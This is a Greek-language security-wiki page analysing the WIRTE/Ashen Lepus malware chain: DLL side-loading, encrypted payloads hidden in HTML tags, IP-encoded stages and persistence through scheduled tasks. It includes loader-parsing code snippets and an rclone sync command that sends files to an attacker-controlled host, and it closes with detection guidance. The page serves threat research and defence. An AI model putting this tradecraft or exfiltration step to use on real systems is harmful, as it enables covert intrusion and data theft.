# Προηγμένο DLL Side-Loading με Staging Payload μέσω HTML

{{#include ../../../banners/hacktricks-training.md}}

## Επισκόπηση Tradecraft

Η Ashen Lepus (γνωστή και ως WIRTE) αξιοποίησε ένα επαναλαμβανόμενο μοτίβο που συνδυάζει DLL sideloading, staged HTML payloads και modular .NET backdoors για να διατηρεί παρουσία σε διπλωματικά δίκτυα της Μέσης Ανατολής. Η τεχνική μπορεί να επαναχρησιμοποιηθεί από οποιονδήποτε operator, επειδή βασίζεται στα εξής:<sup>[[1]](#references)</sup>

- **Social engineering μέσω αρχείου**: καλοπροαίρετα PDF καθοδηγούν τους στόχους να κατεβάσουν ένα αρχείο RAR από ιστότοπο διαμοιρασμού αρχείων. Το αρχείο περιέχει ένα EXE προβολής εγγράφων που φαίνεται αυθεντικό, ένα κακόβουλο DLL με όνομα αξιόπιστης βιβλιοθήκης (π.χ. `netutils.dll`, `srvcli.dll`, `dwampi.dll`, `wtsapi32.dll`) και ένα παραπλανητικό `Document.pdf`.
- **Κατάχρηση της σειράς αναζήτησης DLL**: το θύμα κάνει διπλό κλικ στο EXE, τα Windows εντοπίζουν το εισαγόμενο DLL στον τρέχοντα κατάλογο και ο κακόβουλος loader (AshenLoader) εκτελείται μέσα στην έμπιστη διεργασία, ενώ ανοίγει το παραπλανητικό PDF ώστε να αποφευχθούν οι υποψίες.
- **Staging με Living-off-the-land**: κάθε επόμενο στάδιο (AshenStager → AshenOrchestrator → modules) παραμένει εκτός δίσκου μέχρι να χρειαστεί και παραδίδεται ως κρυπτογραφημένα blobs κρυμμένα σε κατά τα άλλα ακίνδυνες απαντήσεις HTML.

## Αλυσίδα Side-Loading Πολλαπλών Σταδίων

1. **Decoy EXE → AshenLoader**: το EXE φορτώνει πλευρικά το AshenLoader, το οποίο κάνει αναγνώριση του host, κρυπτογραφεί τα δεδομένα του με AES-CTR και τα στέλνει με POST μέσα σε εναλλασσόμενες παραμέτρους όπως `token=`, `id=`, `q=` ή `auth=` προς διαδρομές που μοιάζουν με API (π.χ. `/api/v2/account`).<sup>[[1]](#references)</sup>
2. **Εξαγωγή HTML**: το C2 αποκαλύπτει το επόμενο στάδιο μόνο όταν η γεωγραφική τοποθεσία της IP του client αντιστοιχεί στην περιοχή-στόχο και το `User-Agent` ταιριάζει με το implant, δυσκολεύοντας τα sandboxes. Όταν οι έλεγχοι περάσουν, το σώμα HTTP περιέχει ένα blob `<headerp>...</headerp>` με το payload AshenStager, κρυπτογραφημένο με Base64/AES-CTR.
3. **Δεύτερο sideload**: το AshenStager αναπτύσσεται μαζί με ένα άλλο νόμιμο binary που εισάγει το `wtsapi32.dll`. Το κακόβουλο αντίγραφο, που εγχέεται στο binary, λαμβάνει περισσότερο HTML και αυτή τη φορά εξάγει το AshenOrchestrator από το `<article>...</article>`.
4. **AshenOrchestrator**: ένας modular .NET controller που αποκωδικοποιεί μια διαμόρφωση JSON σε Base64. Τα πεδία `tg` και `au` της διαμόρφωσης συνενώνονται/κατακερματίζονται για να δημιουργήσουν το κλειδί AES, το οποίο αποκρυπτογραφεί το `xrk`. Τα bytes που προκύπτουν λειτουργούν ως κλειδί XOR για κάθε module blob που λαμβάνεται στη συνέχεια.
5. **Παράδοση Modules**: κάθε module περιγράφεται μέσω σχολίων HTML που κατευθύνουν τον parser σε μια αυθαίρετη ετικέτα, παρακάμπτοντας στατικούς κανόνες που αναζητούν μόνο `<headerp>` ή `<article>`. Τα modules περιλαμβάνουν persistence (`PR*`), uninstallers (`UN*`), reconnaissance (`SN`), screen capture (`SCT`) και εξερεύνηση αρχείων (`FE`).

### Μοτίβο Ανάλυσης Container HTML

```csharp
var tag = Regex.Match(html, "<!--\s*TAG:\s*<(.*?)>\s*-->").Groups[1].Value;
var base64 = Regex.Match(html, $"<{tag}>(.*?)</{tag}>", RegexOptions.Singleline).Groups[1].Value;
var aesBytes = AesCtrDecrypt(Convert.FromBase64String(base64), key, nonce);
var module = XorBytes(aesBytes, xorKey);
LoadModule(JsonDocument.Parse(Encoding.UTF8.GetString(module)));
```

Ακόμα κι αν οι defenders αποκλείσουν ή αφαιρέσουν ένα συγκεκριμένο στοιχείο, ο operator χρειάζεται μόνο να αλλάξει το tag που υποδεικνύεται στο HTML comment για να συνεχίσει την παράδοση.<sup>[[1]](#references)</sup>

### Βοηθητικό εργαλείο γρήγορης εξαγωγής (Python)

```python
import base64, re, requests

html = requests.get(url, headers={"User-Agent": ua}).text
tag = re.search(r"<!--\s*TAG:\s*<(.*?)>\s*-->", html, re.I).group(1)
b64 = re.search(fr"<{tag}>(.*?)</{tag}>", html, re.S | re.I).group(1)
blob = base64.b64decode(b64)
# decrypt blob with AES-CTR, then XOR if required
```

## Παραλληλισμοί με την παράκαμψη μέσω HTML staging

Πρόσφατη έρευνα για το HTML smuggling (Talos) αναδεικνύει payloads κρυμμένα ως συμβολοσειρές Base64 μέσα σε blocks `<script>` σε συνημμένα HTML, τα οποία αποκωδικοποιούνται μέσω JavaScript κατά τον χρόνο εκτέλεσης.<sup>[[2]](#references)</sup> Το ίδιο τέχνασμα μπορεί να χρησιμοποιηθεί ξανά για αποκρίσεις C2: τοποθετήστε κρυπτογραφημένα blobs μέσα σε ένα tag script (ή σε άλλο στοιχείο DOM) και αποκωδικοποιήστε τα στη μνήμη πριν από το AES/XOR, ώστε η σελίδα να μοιάζει με συνηθισμένο HTML. Η Talos παρουσιάζει επίσης πολυεπίπεδη συσκότιση (μετονομασία αναγνωριστικών μαζί με Base64/Caesar/AES) μέσα σε tags script, μια προσέγγιση που εφαρμόζεται εύκολα σε blobs C2 με HTML staging.<sup>[[2]](#references)</sup> Σχετική εδώ είναι και μια μεταγενέστερη ανάλυση της Talos για το **hidden text salting**: ο διαχωρισμός του Base64 με άσχετα σχόλια HTML ή κενά αρκεί για να παραπλανήσει απλούς extractors που βασίζονται σε regex, ενώ η ανασύνθεση από την πλευρά του browser παραμένει εύκολη.<sup>[[7]](#references)</sup>

## Σημειώσεις για πρόσφατες παραλλαγές (2024-2025)

- Η Check Point παρατήρησε εκστρατείες WIRTE το 2024 που εξακολουθούσαν να βασίζονται σε archive-based sideloading, αλλά χρησιμοποιούσαν το `propsys.dll` (stagerx64) ως πρώτο stage. Ο stager αποκωδικοποιεί το επόμενο payload με Base64 + XOR (κλειδί `53`), στέλνει HTTP requests με hardcoded `User-Agent` και εξάγει κρυπτογραφημένα blobs ενσωματωμένα ανάμεσα σε HTML tags. Σε έναν κλάδο, το stage ανασυντέθηκε από μια μεγάλη λίστα ενσωματωμένων IP strings που αποκωδικοποιήθηκαν μέσω του `RtlIpv4StringToAddressA` και στη συνέχεια συνενώθηκαν στα bytes του payload.<sup>[[3]](#references)</sup>
- Το OWN-CERT κατέγραψε παλαιότερα εργαλεία WIRTE, στα οποία το dropper με sideloaded `wtsapi32.dll` προστάτευε συμβολοσειρές με Base64 + TEA και χρησιμοποιούσε το ίδιο το όνομα της DLL ως κλειδί αποκρυπτογράφησης. Έπειτα, έκανε XOR/Base64 obfuscation στα δεδομένα αναγνώρισης του host προτού τα στείλει στο C2.<sup>[[4]](#references)</sup>

## Ανακατασκευή σταδίων κωδικοποιημένων ως IP

Ο κλάδος `propsys.dll` της WIRTE του 2024 δείχνει ότι το επόμενο PE δεν χρειάζεται να βρίσκεται σε ένα ενιαίο, συνεχόμενο HTML blob. Ο loader μπορεί να αποθηκεύσει τα bytes του stage ως dotted-quad strings και να τα ανασυνθέσει με το `RtlIpv4StringToAddressA`, μια τεχνική στενά συγγενική με το tradecraft **IPfuscation** της Hive.<sup>[[3]](#references)[[5]](#references)</sup> Από επιχειρησιακή άποψη, αυτό είναι χρήσιμο όταν ο actor θέλει η HTML σελίδα να περιέχει κάτι που μοιάζει με ακίνδυνα IOCs ή δεδομένα ρυθμίσεων αντί για ένα προφανές payload Base64.

```python
import pathlib, re, socket

text = pathlib.Path("stage.txt").read_text(encoding="utf-8")
ips = re.findall(r'((?:\d{1,3}\.){3}\d{1,3})', text)
blob = b"".join(socket.inet_aton(ip) for ip in ips)
pathlib.Path("stage.bin").write_bytes(blob)
```

Αν τα ανακτημένα bytes ξεκινούν με `MZ`, πιθανότατα ανακατασκεύασες απευθείας το επόμενο PE. Αν όχι, έλεγξε για αρχικό επίπεδο XOR/Base64 ή μικρά chunks διαχωρισμού μεταξύ των διευθύνσεων.

## Εναλλάξιμα ονόματα DLL και εναλλαγή host

Ένα σημαντικό χαρακτηριστικό αυτού του μοτίβου είναι ότι το **backend σταδιοποίησης HTML/AES/XOR μπορεί να παραμείνει ίδιο, ενώ αλλάζει μόνο το ζεύγος sideload**. Το WIRTE χρησιμοποίησε διαδοχικά τα `netutils.dll`, `srvcli.dll`, `dwampi.dll`, `wtsapi32.dll` και `propsys.dll` σε διάφορες καμπάνιες, κάτι που είναι χρήσιμο επειδή:<sup>[[1]](#references)[[3]](#references)</sup>

- Τα `propsys.dll` και `wtsapi32.dll` είναι συνηθισμένα ονόματα DLL των Windows, τα οποία οι defenders περιμένουν να υπάρχουν στο `%System32%` / `%SysWOW64%`.
- Δημόσιοι κατάλογοι όπως το **HijackLibs** αντιστοιχίζουν ήδη πολλά binaries που θα φορτώσουν αυτά τα ονόματα DLL από έναν αντιγραμμένο κατάλογο εφαρμογής, προσφέροντας στους operators εναλλακτικά hosts χωρίς να χρειάζεται επανασχεδιασμός του stager.
- Χρειάζεται προσαρμογή μόνο του export surface για κάθε host. Ο HTML parser, οι ρουτίνες AES/XOR και ο module loader μπορούν συνήθως να μεταφερθούν αυτούσιοι σε ένα forwarding proxy DLL.

Για offensive lab εργασία, αυτό σημαίνει ότι μπορείς να χωρίσεις το πρόβλημα σε **(1) εύρεση ενός σταθερού, υπογεγραμμένου host που επιλύει το επιλεγμένο όνομα DLL τοπικά** και **(2) επαναχρησιμοποίηση της ίδιας λογικής staged-HTML loader πίσω από αυτό το DLL**.

## Ενίσχυση Crypto και C2

- **AES-CTR παντού**: οι τρέχοντες loaders ενσωματώνουν κλειδιά 256-bit και nonces (π.χ., `{9a 20 51 98 ...}`) και προαιρετικά προσθέτουν ένα επίπεδο XOR χρησιμοποιώντας strings όπως `msasn1.dll` πριν ή μετά την αποκρυπτογράφηση.<sup>[[1]](#references)</sup>
- **Παραλλαγές key material**: παλαιότεροι loaders χρησιμοποιούσαν Base64 + TEA για την προστασία ενσωματωμένων strings, με το κλειδί αποκρυπτογράφησης να προκύπτει από το όνομα του κακόβουλου DLL (π.χ., `wtsapi32.dll`).<sup>[[4]](#references)</sup>
- **Διαχωρισμός υποδομής + καμουφλάζ subdomain**: οι staging servers διαχωρίζονται ανά εργαλείο, φιλοξενούνται σε διαφορετικά ASNs και μερικές φορές χρησιμοποιούν subdomains που μοιάζουν νόμιμα, ώστε η αποκάλυψη ενός stage να μην εκθέτει τα υπόλοιπα.
- **Λαθραία μεταφορά δεδομένων αναγνώρισης**: τα δεδομένα που απαριθμούνται περιλαμβάνουν πλέον καταχωρίσεις του Program Files για τον εντοπισμό εφαρμογών υψηλής αξίας και κρυπτογραφούνται πάντα πριν αποσταλούν από το host.
- **Εναλλαγή URI**: οι παράμετροι query και οι διαδρομές REST αλλάζουν μεταξύ καμπανιών (`/api/v1/account?token=` → `/api/v2/account?auth=`), ακυρώνοντας εύθραυστες detections.
- **Κλείδωμα User-Agent + ασφαλείς ανακατευθύνσεις**: η υποδομή C2 αποκρίνεται μόνο σε ακριβή UA strings και διαφορετικά ανακατευθύνει σε αβλαβείς ειδησεογραφικούς ή υγειονομικούς ιστότοπους, ώστε να ενσωματώνεται στην κανονική κίνηση.
- **Ελεγχόμενη παράδοση**: οι servers περιορίζουν την πρόσβαση ανά γεωγραφική περιοχή και αποκρίνονται μόνο σε πραγματικά implants. Οι μη εγκεκριμένοι clients λαμβάνουν HTML που δεν κινεί υποψίες.

## Persistence και κύκλος εκτέλεσης

Το AshenStager δημιουργεί scheduled tasks που μεταμφιέζονται σε εργασίες συντήρησης των Windows και εκτελούνται μέσω του `svchost.exe`, π.χ.:<sup>[[1]](#references)</sup>

- `C:\Windows\System32\Tasks\Windows\WindowsDefenderUpdate\Windows Defender Updater`
- `C:\Windows\System32\Tasks\Windows\WindowsServicesUpdate\Windows Services Updater`
- `C:\Windows\System32\Tasks\Automatic Windows Update`

Αυτές οι εργασίες επανεκκινούν την αλυσίδα sideloading κατά την εκκίνηση ή ανά τακτά διαστήματα, επιτρέποντας στο AshenOrchestrator να ζητά νέα modules χωρίς να χρειάζεται ξανά πρόσβαση στον δίσκο.

## Χρήση νόμιμων clients συγχρονισμού για exfiltration

Οι operators τοποθετούν διπλωματικά έγγραφα μέσα στο `C:\Users\Public` (αναγνώσιμο από όλους και χωρίς να κινεί υποψίες) μέσω ενός ειδικού module και, στη συνέχεια, κατεβάζουν το νόμιμο binary [Rclone](https://rclone.org/) για να συγχρονίσουν αυτόν τον κατάλογο με αποθηκευτικό χώρο που ελέγχουν οι attackers. Το Unit42 σημειώνει ότι αυτή είναι η πρώτη φορά που έχει παρατηρηθεί ο συγκεκριμένος actor να χρησιμοποιεί το Rclone για exfiltration, κάτι που συνάδει με την ευρύτερη τάση κατάχρησης νόμιμων εργαλείων συγχρονισμού για την ενσωμάτωση στην κανονική κίνηση:<sup>[[1]](#references)</sup>

1. **Σταδιοποίηση**: αντιγραφή/συλλογή των αρχείων-στόχων στο `C:\Users\Public\{campaign}\`.
2. **Ρύθμιση**: αποστολή μιας διαμόρφωσης Rclone που δείχνει σε HTTPS endpoint ελεγχόμενο από attacker (π.χ., `api.technology-system[.]com`).
3. **Συγχρονισμός**: εκτέλεση του `rclone sync "C:\Users\Public\campaign" remote:ingest --transfers 4 --bwlimit 4M --quiet`, ώστε η κίνηση να μοιάζει με συνηθισμένα cloud backups.

Επειδή το Rclone χρησιμοποιείται ευρέως για νόμιμες διαδικασίες backup, οι defenders πρέπει να εστιάζουν σε ασυνήθιστες εκτελέσεις (νέα binaries, ύποπτα remotes ή ξαφνικό συγχρονισμό του `C:\Users\Public`).

## Σημεία διερεύνησης

- Δημιουργήστε alert για **υπογεγραμμένες διεργασίες** που φορτώνουν απροσδόκητα DLL από διαδρομές εγγράψιμες από χρήστες (φίλτρα Procmon + `Get-ProcessMitigation -Module`), ειδικά όταν τα ονόματα DLL περιλαμβάνουν τα `netutils`, `srvcli`, `dwampi`, `wtsapi32` ή `propsys`.<sup>[[6]](#references)</sup>
- Εξετάστε ύποπτες HTTPS αποκρίσεις για **μεγάλα Base64 blobs ενσωματωμένα σε ασυνήθιστα tags** ή προστατευμένα με σχόλια `<!-- TAG: <xyz> -->`.
- Κανονικοποιήστε πρώτα το HTML: **αφαιρέστε τα σχόλια και συμπτύξτε τα κενά πριν από την εξαγωγή Base64**, επειδή η τεχνική αποφυγής hidden-text-salting μπορεί να διασπάσει payloads σε όρια σχολίων.
- Επεκτείνετε την αναζήτηση στο HTML ώστε να εντοπίζει **Base64 strings μέσα σε blocks `<script>`** (σταδιοποίηση τύπου HTML smuggling), τα οποία αποκωδικοποιούνται μέσω JavaScript πριν από την επεξεργασία AES/XOR.
- Αναζητήστε επαναλαμβανόμενες κλήσεις του **`RtlIpv4StringToAddressA` ακολουθούμενες από σύνθεση buffer**, ειδικά όταν τα σχετικά strings είναι μεγάλες λίστες IPv4 και όχι πραγματικοί δικτυακοί στόχοι.
- Αναζητήστε **scheduled tasks** που εκτελούν το `svchost.exe` με ορίσματα που δεν σχετίζονται με υπηρεσίες ή παραπέμπουν σε καταλόγους dropper.
- Παρακολουθήστε **ανακατευθύνσεις C2** που επιστρέφουν payloads μόνο για ακριβή strings `User-Agent` και διαφορετικά ανακατευθύνουν σε νόμιμους ειδησεογραφικούς ή υγειονομικούς τομείς.
- Παρακολουθήστε για **binaries Rclone** εκτός τοποθεσιών που διαχειρίζεται το IT, νέα αρχεία `rclone.conf` ή εργασίες συγχρονισμού από καταλόγους σταδιοποίησης όπως το `C:\Users\Public`.

## References

- [1] [Ashen Lepus, συνδεόμενος με τη Hamas, στοχεύει διπλωματικές οντότητες στη Μέση Ανατολή με τη νέα σουίτα κακόβουλου λογισμικού AshTag](https://unit42.paloaltonetworks.com/hamas-affiliate-ashen-lepus-uses-new-malware-suite-ashtag/)
- [2] [Κρυμμένα ανάμεσα στα tags: Ενημερώσεις για τις τεχνικές αποφυγής εντοπισμού στο HTML smuggling](https://blog.talosintelligence.com/hidden-between-the-tags-insights-into-evasion-techniques-in-html-smuggling/)
- [3] [Ο actor απειλών WIRTE, συνδεόμενος με τη Hamas, συνεχίζει τις επιχειρήσεις του στη Μέση Ανατολή και προχωρά σε διασπαστική δραστηριότητα](https://research.checkpoint.com/2024/hamas-affiliated-threat-actor-expands-to-disruptive-activity/)
- [4] [WIRTE: Σε αναζήτηση του χαμένου χρόνου](https://www.own.security/en/ressources/blog/wirte-analyse-campagne-cyber-own-cert)
- [5] [Το Hive Ransomware αναπτύσσει μια νέα τεχνική IPfuscation για την αποφυγή εντοπισμού](https://www.sentinelone.com/blog/hive-ransomware-deploys-novel-ipfuscation-technique/)
- [6] [Πιθανό System DLL Sideloading από μη System τοποθεσίες](https://detection.fyi/sigmahq/sigma/windows/image_load/image_load_side_load_from_non_system_location/)
- [7] [Προσθήκη κρυφού text salting σε απειλητικά email](https://blog.talosintelligence.com/seasoning-email-threats-with-hidden-text-salting/)
{{#include ../../../banners/hacktricks-training.md}}
